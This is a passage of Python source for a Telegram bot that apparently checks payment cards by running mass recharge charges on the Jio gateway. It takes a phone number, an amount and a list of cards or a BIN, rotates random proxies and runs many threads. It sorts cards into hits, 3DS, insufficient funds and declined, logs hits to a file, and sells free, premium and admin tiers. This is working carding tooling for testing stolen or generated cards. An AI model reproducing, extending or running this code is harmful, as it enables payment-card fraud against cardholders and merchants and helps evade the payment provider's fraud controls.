            "<code>/mjio &lt;phone&gt; &lt;amount&gt; &lt;bin&gt; &lt;count&gt;</code>\n"
            "OR reply .txt with: <code>/mjio &lt;phone&gt; &lt;amount&gt;</code>",
            parse_mode="HTML"); return

    job_id = f"{int(time.time())}{random.randint(100,999)}"
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[uid] = True
    total = len(cards)

    results = {"hits":0,"hits_list":[],"declined":0,"declined_list":[],
               "3ds":0,"3ds_list":[],"error":0,"error_list":[],"checked":0,
               "insufficient":0,"insufficient_list":[]}
    start_time = time.time()
    last_update = [0]
    ulock = threading.Lock()
    rk = " [ADMIN]" if is_admin(uid) else (" [PREMIUM]" if is_premium(uid) else " [FREE]")

    def cap(done=False):
        el = int(time.time() - start_time); m, s = divmod(el, 60)
        st = "✅ Completed\n" if done else ""
        return (f"📊 <b>Mass Jio Recharge</b>\n━━━━━━━━━━━━━━━━━━━━\n{st}"
                f"┣ 📦 Progress ➜ {results['checked']}/{total}\n"
                f"┣ ✅ Hits ➜ {results['hits']}\n"
                f"┣ 🔥 3DS ➜ {results['3ds']}\n"
                f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                f"┣ ❌ Declined ➜ {results['declined']}\n"
                f"┣ ⚠️ Errors ➜ {results['error']}\n"
                f"┗ ⏱️ Time ➜ {m:02d}:{s:02d}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: {message.from_user.first_name}{rk}")

    def mkup(done=False):
        m = telebot.types.InlineKeyboardMarkup()
        if not done:
            m.add(telebot.types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{job_id}"))
        return m

    prog = bot.reply_to(message, cap(), parse_mode="HTML", reply_markup=mkup())

    def worker(card):
        if not ACTIVE_JOBS.get(job_id): return
        proxy = get_random_proxy()
        try:
            status, response, meta = jio_check(phone, amount, card, proxy_str=proxy)
        except Exception as e:
            status, response = "error", f"Failed: {e}"
        entry = f"{card_label(card)} - {response}"

        if status == "success":
            results["hits"] += 1; results["hits_list"].append(entry)
            with open(HITS_FILE, 'a', encoding="utf-8") as f:
                f.write(f"{phone} Rs{amount} {card_label(card)} - {response}\n")
        elif status == "3ds":
            results["3ds"] += 1; results["3ds_list"].append(entry)
        elif status == "insufficient":
            results["insufficient"] += 1; results["insufficient_list"].append(entry)
        elif status in ("expired","invalid_cvv","invalid_card","issuer_decline","blocked",
                        "not_permitted","limit_exceeded","velocity","processor_error","failed"):
            results["declined"] += 1; results["declined_list"].append(entry)
        else:
            results["error"] += 1; results["error_list"].append(entry)
        results["checked"] += 1

        if status in ("success", "3ds", "insufficient"):
            safe = str(response).replace("<","").replace(">","").replace("&","")
            safe_name = str(message.from_user.first_name).replace("<","").replace(">","").replace("&","")
            single = (
                f"{status_head(status)}\n━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Phone</b> ━ <code>{phone}</code>\n"
                f"💰 <b>Amount</b> ━ ₹{amount}\n"
                f"💳 <b>Card</b> ━ <code>{card_label(card)}</code>\n"
                f"📩 <b>Response</b> ━ {safe}\n"
                f"🌐 <b>Gateway</b> ━ Jio Recharge\n━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {safe_name}{rk}"
            )
            try:
                bot.send_message(message.chat.id, single, parse_mode="HTML")
                time.sleep(random.uniform(1.0, 2.0))
            except Exception as e:
                err = str(e)
                if '429' in err:
                    m = re.search(r'retry after (\d+)', err)
                    time.sleep(int(m.group(1))+2 if m else 30)
                else: time.sleep(3)

        with ulock:
            do = results["checked"] >= last_update[0] + 2 or results["checked"] == total
            if do: last_update[0] = results["checked"]
        if do:
            try: bot.edit_message_text(cap(), message.chat.id, prog.message_id,
                                       parse_mode="HTML", reply_markup=mkup())
            except: pass

    try:
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            for c in cards:
                if not ACTIVE_JOBS.get(job_id): break
                ex.submit(worker, c)
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[uid] = False
        try: bot.edit_message_text(cap(done=True), message.chat.id, prog.message_id,
                                   parse_mode="HTML", reply_markup=mkup(done=True))
        except: pass

        lines = []
        for sec, lbl in [("hits_list","HITS"),("3ds_list","3DS"),
                         ("insufficient_list","INSUFFICIENT FUNDS"),
                         ("declined_list","DECLINED"),("error_list","ERRORS")]:
            if results.get(sec):
                lines.append(f"{lbl}:"); lines.extend(results[sec]); lines.append("")
        if lines:
            content = "\n".join(lines)
            fcap = (f"📊 <b>Results</b>\n━━━━━━━━━━━━━━━━━━━━\n"
                    f"┣ ✅ Hits ➜ {results['hits']}\n"
                    f"┣ 🔥 3DS ➜ {results['3ds']}\n"
                    f"┣ 💸 Insufficient ➜ {results['insufficient']}\n"
                    f"┣ ❌ Declined ➜ {results['declined']}\n"
                    f"┣ ⚠️ Errors ➜ {results['error']}\n"
                    f"┗ 📦 Total ➜ {results['checked']}")
            path = "JioResults.txt"
            with open(path, "w", encoding="utf-8") as f: f.write(content)
            with open(path, "rb") as f:
                bot.send_document(message.chat.id, f, caption=fcap, parse_mode="HTML")
            try: os.remove(path)
            except: pass
    except Exception as e:
        ACTIVE_JOBS.pop(job_id, None)
        ACTIVE_USERS_MPP[uid] = False
        try: bot.edit_message_text(cap(done=True), message.chat.id, prog.message_id,
                                   parse_mode="HTML", reply_markup=mkup(done=True))
        except: pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[5:]
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False

@bot.message_handler(commands=['info'])
def user_info(message):
    uid = str(message.from_user.id)
    role, limit, exp = "[FREE]", FREE_LIMIT, "NEVER"
    if is_admin(int(uid)):
        role, limit, exp = "[ADMIN]", ADMIN_LIMIT, "Lifetime"
    elif is_premium(int(uid)):
        role, limit = "[PREMIUM]", PREMIUM_LIMIT
        with open(PREMIUM_FILE, 'r') as f:
            for line in f:
                if line.startswith(uid + "|"):
                    e = float(line.strip().split('|')[1])
                    exp = "Lifetime" if e == 0 else datetime.datetime.fromtimestamp(e).strftime('%Y-%m-%d %H:%M:%S')
                    break
    bot.reply_to(message,
        f"👤 <b>Account Info</b>\n━━━━━━━━━━━━━\n"
        f"🆔 <b>ID:</b> {uid}\n"
        f"👑 <b>Rank:</b> {role}\n"
        f"📅 <b>Expires:</b> {exp}\n"
        f"🔢 <b>Mass Limit:</b> {limit}",
        parse_mode="HTML")

# ================= ADMIN =================
@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        tid, dur = p[1], p[2]
        now = time.time()
        if dur == 'lifetime': exp = 0
        elif dur.endswith('d'): exp = now + int(dur[:-1]) * 86400
        elif dur.endswith('h'): exp = now + int(dur[:-1]) * 3600
        elif dur.endswith('m'): exp = now + int(dur[:-1]) * 60
        elif dur.endswith('s'): exp = now + int(dur[:-1])
        else: raise Exception()
        with open(PREMIUM_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
        bot.reply_to(message, f"✅ <b>Premium added</b> ➜ {tid} ({dur})", parse_mode="HTML")
        try: bot.send_message(int(tid), f"👑 <b>Premium added!</b> Duration: {dur}", parse_mode="HTML")
        except: pass
    except:
        bot.reply_to(message, "📝 <code>/addpremium &lt;id&gt; &lt;1d/lifetime&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        bot.reply_to(message, f"✅ <b>Premium removed</b> ➜ {tid}", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/rmpremium &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        p = message.text.split()
        tid = p[1]
        dur = p[2] if len(p) > 2 else 'lifetime'
        now = time.time()
        if dur == 'lifetime': exp = 0
        elif dur.endswith('d'): exp = now + int(dur[:-1]) * 86400
        elif dur.endswith('h'): exp = now + int(dur[:-1]) * 3600
        elif dur.endswith('m'): exp = now + int(dur[:-1]) * 60
        elif dur.endswith('s'): exp = now + int(dur[:-1])
        else: raise Exception()
        with open(BANNED_FILE, 'a') as f: f.write(f"{tid}|{exp}\n")
        bot.reply_to(message, f"✅ <b>Banned</b> ➜ {tid} ({dur})", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/ban &lt;id&gt; &lt;duration&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    try:
        tid = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if not l.startswith(tid + "|"): f.write(l)
        bot.reply_to(message, f"✅ <b>Unbanned</b> ➜ {tid}", parse_mode="HTML")
    except: bot.reply_to(message, "📝 <code>/unban &lt;id&gt;</code>", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "❌ <b>Admin only.</b>", parse_mode="HTML"); return
    with open(USERS_FILE, 'r') as f: uc = len(f.read().splitlines())
    with open(PREMIUM_FILE, 'r') as f: pc = len(f.read().splitlines())
    with open(BANNED_FILE, 'r') as f: bc = len(f.read().splitlines())
    with open(HITS_FILE, 'r') as f: hc = len(f.read().splitlines())
    bot.reply_to(message,
        f"📊 <b>Bot Stats</b>\n━━━━━━━━━━━━━\n"
        f"✅ <b>Total Hits:</b> {hc}\n"
        f"👤 <b>Users:</b> {uc}\n"
        f"👑 <b>Premium:</b> {pc}\n"
        f"❌ <b>Banned:</b> {bc}",
        parse_mode="HTML")

# ================= MAIN =================
if __name__ == "__main__":
    print("JIO RECHARGE BOT IS RUNNING...\n")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)
